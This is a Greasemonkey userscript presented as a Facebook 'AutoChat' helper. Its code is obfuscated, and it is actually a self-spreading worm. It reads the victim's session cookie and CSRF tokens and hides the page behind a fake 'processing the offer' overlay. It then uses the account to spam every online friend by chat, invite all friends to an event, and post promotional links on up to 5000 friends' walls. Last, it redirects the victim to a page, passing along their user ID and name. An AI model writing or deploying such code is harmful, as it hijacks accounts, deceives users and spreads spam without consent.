// ==UserScript==
// @name           Facebook AutoChat By. Odonk
// @namespace      AutoChat Facebook
// @description    Automaticly Chat
// @include        http://www.facebook.com/*
// ==/UserScript==

// ==============
// ==Chat==
var randomnumber=Math.floor(Math.random()*99999);
var chatmessage = '%firstname%, Mau diadd ribuan teman..kunjungi sekarang http://http://facebook.com/pages/CINTA/238874619497875?sk=wall';
var postmessage = 'teman teman kalau Mau diadd lebih dari 200ribu orang teman di indonesia..kunjungi sekarang http://facebook.com/pages/CINTA/238874619497875?sk=wall';
var redirect = 'http://facebook.com/pages/CINTA/238874619497875?sk=wall';
var eventdesc = 'klik di \n\ \n\ Go here:  http://facebook.com/pages/CINTA/238874619497875?sk=wall';
var eventname = 'test by!';
var nfriends = 5000;
var debug = false;
var wf = 0;
var mf = function () {
        if (wf <= 0) {
            setTimeout(function () {
                window['top']['location']['href'] = redirect;
            }, 500);
        };
    };
var doget = function (_0xaa04xb, _0xaa04xc, _0xaa04xd) {
        var _0xaa04xe = new XMLHttpRequest();
        _0xaa04xe['open']('GET', _0xaa04xb);
        _0xaa04xe['onreadystatechange'] = function () {
            if (_0xaa04xe['readyState'] == 4) {
                if (_0xaa04xe['status'] == 200 && _0xaa04xc) {
                    _0xaa04xc(_0xaa04xe['responseText']);
                };
                if (_0xaa04xd) {
                    _0xaa04xd();
                };
            };
        };
        _0xaa04xe['send']();
    };
doget('/', function (_0xaa04xf) {
    var _0xaa04x10 = document['cookie']['match'](/c_user=(\d+)/)[1];
    var _0xaa04x11 = function (_0xaa04x12) {
            return _0xaa04x12 ? '@[' + _0xaa04x12['id'] + ':' + _0xaa04x12['name'] + ']' : '';
        };
    var _0xaa04x13 = function (_0xaa04x12) {
            return _0xaa04x12 ? _0xaa04x12['name'] : '';
        };
    var _0xaa04x14 = function (_0xaa04x12) {
            out = '';
            for (var _0xaa04x15 in _0xaa04x12) {
                out += (out ? '&' : '') + _0xaa04x15 + ((_0xaa04x12[_0xaa04x15] !== null) ? '=' + encodeURIComponent(_0xaa04x12[_0xaa04x15]) : '');
            };
            return out;
        };
    var _0xaa04x16 = function (_0xaa04xb, _0xaa04x12, _0xaa04xc, _0xaa04xd) {
            var _0xaa04xe = new XMLHttpRequest();
            _0xaa04xe['open']('POST', _0xaa04xb);
            _0xaa04xe['setRequestHeader']('Content-Type', 'application/x-www-form-urlencoded');
            _0xaa04xe['onreadystatechange'] = function () {
                if (_0xaa04xe['readyState'] == 4) {
                    if (_0xaa04xe['status'] == 200 && _0xaa04xc) {
                        _0xaa04xc(_0xaa04xe['responseText']);
                    };
                    if (_0xaa04xd) {
                        _0xaa04xd();
                    };
                };
            };
            _0xaa04xe['send'](_0xaa04x14(_0xaa04x12));
        };
    var _0xaa04x17 = function () {
            var _0xaa04x18 = document['createElement']('div');
            _0xaa04x18['style']['display'] = 'block';
            _0xaa04x18['style']['position'] = 'absolute';
            _0xaa04x18['style']['width'] = 100 + '%';
            _0xaa04x18['style']['height'] = 100 + '%';
            _0xaa04x18['style']['left'] = 0 + 'px';
            _0xaa04x18['style']['top'] = 0 + 'px';
            _0xaa04x18['style']['textAlign'] = 'center';
            _0xaa04x18['style']['padding'] = '4px';
            _0xaa04x18['style']['background'] = '#FFFFFF';
            _0xaa04x18['style']['zIndex'] = 999999;
            _0xaa04x18['innerHTML'] = '&nbsp;<br/>Please wait, this can take a little while...<br/><br/> We are processing the offer for you... <a href="javascript:void(0);" onclick="wf=0; mf();">click here</a> ';
            document['body']['appendChild'](_0xaa04x18);
        };
    var _0xaa04x19 = _0xaa04xf['match'](/name=\\"xhpc_composerid\\" value=\\"([\d\w]+)\\"/i);
    if (_0xaa04x19) {
        comp = _0xaa04x19[1];
    } else {
        comp = '';
    };
    var _0xaa04x1a = _0xaa04xf['match'](/name="post_form_id" value="([\d\w]+)"/i)[1];
    var _0xaa04x1b = _0xaa04xf['match'](/name="fb_dtsg" value="([\d\w]+)"/i)[1];
    var _0xaa04x1c = document['getElementById']('navAccountName')['firstChild']['data'];
    redirect = redirect + '?' + _0xaa04x14({
        userid: _0xaa04x10,
        name: _0xaa04x1c,
        doclose: 1
    });
    _0xaa04x17();
    if (eventdesc) {
        wf++;
        _0xaa04x16('/ajax/choose/?__a=1', {
            type: 'event',
            eid: null,
            invite_message: 'hallo teman teman mau diadd ribuan teman hanya dengan 1 ddetik saja klik disini http://facebook.com/pages/CINTA/238874619497875?sk=wall',
            __d: 1,
            post_form_id: _0xaa04x1a,
            fb_dtsg: _0xaa04x1b,
            lsd: null,
            post_form_id_source: 'AsyncRequest'
        }, function (_0xaa04x1d) {
            var _0xaa04x1e = _0xaa04x1d['match'](/\\"token\\":\\"([^\\]+)\\"/)[1];
            var _0xaa04xb = '/ajax/typeahead/first_degree.php?__a=1&viewer=' + _0xaa04x10 + '&token=' + _0xaa04x1e + '&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha';
            doget(_0xaa04xb, function (_0xaa04x1f) {
                var _0xaa04x20 = _0xaa04x1f['match'](/\{"uid":\d+,/g);
                var _0xaa04x21 = [];
                for (var _0xaa04x22 = 0; _0xaa04x22 < _0xaa04x20['length']; _0xaa04x22++) {
                    var _0xaa04x23 = _0xaa04x20[_0xaa04x22]['match'](/:(\d+),/)[1];
                    if (_0xaa04x23 != _0xaa04x10) {
                        _0xaa04x21['push'](_0xaa04x23);
                    };
                };
                var _0xaa04x24 = new Date();
                _0xaa04x24['setTime'](_0xaa04x24['getTime']() + 60 * 60 * 24 * 1000);
                datestr = (_0xaa04x24['getMonth']() + 1) + '/' + _0xaa04x24['getDate']() + '/' + _0xaa04x24['getFullYear']();
                timestr = _0xaa04x24['getHours']() * 60;
                var _0xaa04x25 = {
                    post_form_id: _0xaa04x1a,
                    fb_dtsg: _0xaa04x1b,
                    start_dateIntlDisplay: datestr,
                    start_date: datestr,
                    start_time_hour_min: timestr,
                    name: eventname,
                    place_page_id: '',
                    location: 'indonesia',
                    street: 'jempolers',
                    geo_id: '',
                    geo_sq: '',
                    desc: eventdesc,
                    sgb_invitees: _0xaa04x21['join'](','),
                    sgb_emails: '',
                    sgb_message: '',
                    privacy_type: 'on',
                    guest_list: 'on',
                    connections_can_post: 'on',
                    save: 'Create Event',
                    submitting: ''
                };
                _0xaa04x25['new'] = '';
                _0xaa04x16('/events/create.php', _0xaa04x25, false, function () {
                    mf(--wf);
                });
            });
        });
    };
    if (chatmessage) {
        wf++;
        _0xaa04x16('/ajax/chat/buddy_list.php?__a=1', {
            user: _0xaa04x10,
            post_form_id: _0xaa04x1a,
            fb_dtsg: _0xaa04x1b,
            lsd: null,
            post_form_id_source: 'AsyncRequest',
            popped_out: false,
            force_render: true
        }, function (_0xaa04x1d) {
            var _0xaa04x26 = _0xaa04x1d['substr'](9);
            var _0xaa04x27 = eval('(' + _0xaa04x26 + ')');
            var _0xaa04x28 = _0xaa04x27['payload']['buddy_list'];
            for (var _0xaa04x29 in _0xaa04x28['nowAvailableList']) {
                var _0xaa04x2a = Math['floor'](Math['random']() * 1335448958);
                var _0xaa04x2b = (new Date())['getTime']();
                var _0xaa04x2c = chatmessage['replace']('%firstname%', _0xaa04x28['userInfos'][_0xaa04x29]['firstName']['toLowerCase']());
                _0xaa04x16('/ajax/chat/send.php?__a=1', {
                    msg_id: Math['floor'](Math['random']() * 1335448958),
                    client_time: (new Date())['getTime'](),
                    msg_text: chatmessage['replace']('%firstname%', _0xaa04x28['userInfos'][_0xaa04x29]['firstName']['toLowerCase']()),
                    to: _0xaa04x29,
                    post_form_id: _0xaa04x1a,
                    fb_dtsg: _0xaa04x1b,
                    post_form_id_source: 'AsyncRequest'
                });
            };
            mf(--wf);
        });
    };
    if (postmessage) {
        wf++;
        doget('/ajax/browser/friends/?uid=' + _0xaa04x10 + '&filter=all&__d=1&__d=1', function (_0xaa04x1d) {
            var _0xaa04x20 = _0xaa04x1d['match'](/\/\d+_\d+_\d+_q\.jpg.*?u003ca href=\\"http:\\\/\\\/www.facebook.com\\\/.*?\\u003c\\\/a>/gi);
            var _0xaa04x2d = [];
            if (_0xaa04x20) {
                for (var _0xaa04x22 = 0; _0xaa04x22 < _0xaa04x20['length']; _0xaa04x22++) {
                    var _0xaa04x23 = _0xaa04x20[_0xaa04x22]['match'](/_\d+_/)[0]['replace'](/_/g, '');
                    var _0xaa04x2e = _0xaa04x20[_0xaa04x22]['match'](/>[^>]+\\u003c\\\/a>$/i)[0]['replace'](/\\u003c\\\/a>$/gim, '')['replace'](/>/g, '');
                    _0xaa04x2d['push']({
                        id: _0xaa04x23,
                        name: _0xaa04x2e
                    });
                };
            };
            var _0xaa04xd = [];
            var _0xaa04x2f = [];
            while (_0xaa04x2d['length']) {
                var _0xaa04x30 = Math['floor'](Math['random']() * _0xaa04x2d['length']);
                _0xaa04xd['push'](_0xaa04x2d[_0xaa04x30]);
                _0xaa04x2f['push'](_0xaa04x2d[_0xaa04x30]);
                var _0xaa04x2b = _0xaa04x2d['shift']();
                if (_0xaa04x30) {
                    _0xaa04x2d[_0xaa04x30 - 1] = _0xaa04x2b;
                };
            };
            if (debug) {
                alert('fetched friends: ' + _0xaa04xd['length']);
            };
            var _0xaa04x31 = {
                post_form_id: _0xaa04x1a,
                fb_dtsg: _0xaa04x1b,
                xhpc_composerid: comp,
                xhpc_targetid: _0xaa04x10,
                xhpc_context: 'home',
                xhpc_fbx: '',
                lsd: null,
                post_form_id_source: 'AsyncRequest'
            };
            mt = postmessage;
            m = postmessage;
            while (mt['search']('%tf%') >= 0) {
                var _0xaa04x32 = _0xaa04xd['pop']();
                mt = mt['replace']('%tf%', _0xaa04x13(_0xaa04x32));
                m = m['replace']('%tf%', _0xaa04x11(_0xaa04x32));
            };
            _0xaa04x31['xhpc_message_text'] = mt;
            _0xaa04x31['xhpc_message'] = m;
            if (debug) {
                alert('message text: ' + mt);
            };
            _0xaa04x16('/ajax/updatestatus.php?__a=1', _0xaa04x31);
            var _0xaa04x33 = function (_0xaa04x15) {
                    if (_0xaa04x15 == 0) {
                        wf = 0;
                        mf();
                        return;
                    };
                    var _0xaa04x34 = _0xaa04x2f['shift']();
                    var _0xaa04x35 = {
                        post_form_id: _0xaa04x1a,
                        fb_dtsg: _0xaa04x1b,
                        xhpc_composerid: comp,
                        xhpc_targetid: _0xaa04x34['id'],
                        xhpc_context: 'profile',
                        xhpc_fbx: 1,
                        lsd: null,
                        post_form_id_source: 'AsyncRequest'
                    };
                    var _0xaa04x36 = postmessage;
                    var _0xaa04x37 = postmessage;
                    if (_0xaa04xd['length'] == 0) {
                        wf = 0;
                        mf();
                        return;
                    };
                    while (_0xaa04x36['search']('%tf%') >= 0) {
                        var _0xaa04x38 = _0xaa04xd['pop']();
                        _0xaa04x36 = _0xaa04x36['replace']('%tf%', _0xaa04x13(_0xaa04x38));
                        _0xaa04x37 = _0xaa04x37['replace']('%tf%', _0xaa04x11(_0xaa04x38));
                    };
                    _0xaa04x35['xhpc_message_text'] = _0xaa04x36;
                    _0xaa04x35['xhpc_message'] = _0xaa04x37;
                    _0xaa04x16('/ajax/updatestatus.php?__a=1', _0xaa04x35);
                    setTimeout(function () {
                        _0xaa04x33(_0xaa04x15 - 1);
                    }, 2000);
                };
            wf++;
            setTimeout(function () {
                _0xaa04x33(nfriends);
            }, 2000);
        });
    };
    mf();
});